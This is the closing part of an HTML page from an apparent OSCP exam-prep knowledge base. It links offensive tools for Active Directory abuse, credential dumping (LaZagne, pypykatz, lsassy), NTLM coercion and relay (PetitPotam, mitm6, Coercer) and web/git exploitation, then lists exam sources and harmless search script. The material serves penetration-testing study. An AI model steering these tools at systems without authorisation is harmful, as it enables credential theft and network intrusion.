+<p><strong>AD — Kerberos / ACL / certs:</strong></p>
+<p><a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener">kerbrute</a> · <a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">bloodyAD</a> · <a href="https://github.com/ShutdownRepo/pywhisker" target="_blank" rel="noopener">pywhisker</a> · <a href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank" rel="noopener">SharpGPOAbuse</a> · <a href="https://github.com/Hackndo/pyGPOAbuse" target="_blank" rel="noopener">pyGPOAbuse</a> · <a href="https://github.com/GhostPack/Certify" target="_blank" rel="noopener">Certify</a> · <a href="https://github.com/AlmondOffSec/PassTheCert" target="_blank" rel="noopener">PassTheCert</a> · <a href="https://github.com/micahvandeusen/gMSADumper" target="_blank" rel="noopener">gMSADumper</a> · <a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">PowerUpSQL</a> · <a href="https://github.com/ropnop/windapsearch" target="_blank" rel="noopener">windapsearch</a> · <a href="https://github.com/cddmp/enum4linux-ng" target="_blank" rel="noopener">enum4linux-ng</a></p>
+<p><strong>AD — cred dumping / coercion / relay:</strong></p>
+<p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a> · <a href="https://github.com/skelsec/pypykatz" target="_blank" rel="noopener">pypykatz</a> · <a href="https://github.com/Hackndo/lsassy" target="_blank" rel="noopener">lsassy</a> · <a href="https://github.com/dirkjanm/mitm6" target="_blank" rel="noopener">mitm6</a> · <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">Inveigh</a> · <a href="https://github.com/topotam/PetitPotam" target="_blank" rel="noopener">PetitPotam</a> · <a href="https://github.com/p0dalirius/Coercer" target="_blank" rel="noopener">Coercer</a> · <a href="https://github.com/Greenwolf/ntlm_theft" target="_blank" rel="noopener">ntlm_theft</a></p>
+<p><strong>Web / git:</strong></p>
+<p><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">PHPGGC</a> · <a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener">GitTools</a> · <a href="https://github.com/arthaud/git-dumper" target="_blank" rel="noopener">git-dumper</a></p>
+<blockquote><strong>Kali built-ins don&#x27;t need download links</strong> — nmap, ffuf/feroxbuster/gobuster, nikto, hydra/medusa, john/hashcat, sqlmap, smbclient/smbmap, enum4linux, rpcclient, ldapsearch, snmpwalk, responder, proxychains, sshuttle, masscan, cewl, crunch, dnsrecon, wpscan, etc. all ship with Kali (<code>apt</code>); see <code class="tag">[KALI-SETUP]</code>/<code class="tag">[KALI-TOOLBOX]</code>.</blockquote>
+<blockquote>⚠️ Links/repos move over time — if one 404s, search the project name. Always confirm tool <strong>flag syntax</strong> against the version installed on your Kali.</blockquote>
+<h2 id="v8-n-[sources]">N. [SOURCES]<a class="anchor" href="#v8-n-[sources]">#</a></h2>
+<ul>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank" rel="noopener">OSCP+ Exam Guide – OffSec Support Portal</a> — official exam structure, proof, tool rules.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ" target="_blank" rel="noopener">OSCP+ Exam FAQ – OffSec Support Portal</a> — Metasploit/tool clarifications.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/29840452210580-Changes-to-the-OSCP" target="_blank" rel="noopener">Changes to the OSCP – OffSec</a> — OSCP vs OSCP+, bonus removal.</li>
+<li><a href="https://www.offsec.com/blog/everything-you-need-to-know-about-the-oscp-plus/" target="_blank" rel="noopener">Everything you need to know about the OSCP+ – OffSec Blog</a> — official OSCP+ overview.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/36010548001812-Renewing-OffSec-Certification-by-Taking-a-Qualifying-Certification-Exam" target="_blank" rel="noopener">Renewing OffSec Certification – OffSec</a> — 3-year renewal paths.</li>
+<li><a href="https://www.stationx.net/oscp-exam-guide/" target="_blank" rel="noopener">OSCP Exam Guide (2026) – StationX</a> — [COMMUNITY] structure summary.</li>
+<li><a href="https://www.macksofytrainings.com/oscp-plus-2026-update-new-exam-structure-ad-sets/" target="_blank" rel="noopener">OSCP+ 2026 Update – Macksofy</a> — [COMMUNITY] AD-set emphasis.</li>
+<li><strong>Tool/technique references</strong> [GENERAL], verify syntax on official docs: GTFOBins, HackTricks, PayloadsAllTheThings, Impacket/NetExec/BloodHound/Ligolo-ng/Chisel/hashcat docs, TJ Null&#x27;s OSCP-like list. *(This KB synthesizes these — always confirm exact flags against the current tool version.)*</li>
+</ul>
+<hr>
+<p>*End Volume 6. Full KB = VOL-0 … VOL-6. Merge: <code>cat VOL-*.md &gt; OSCP-KB-COMPLETE.md</code>.*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
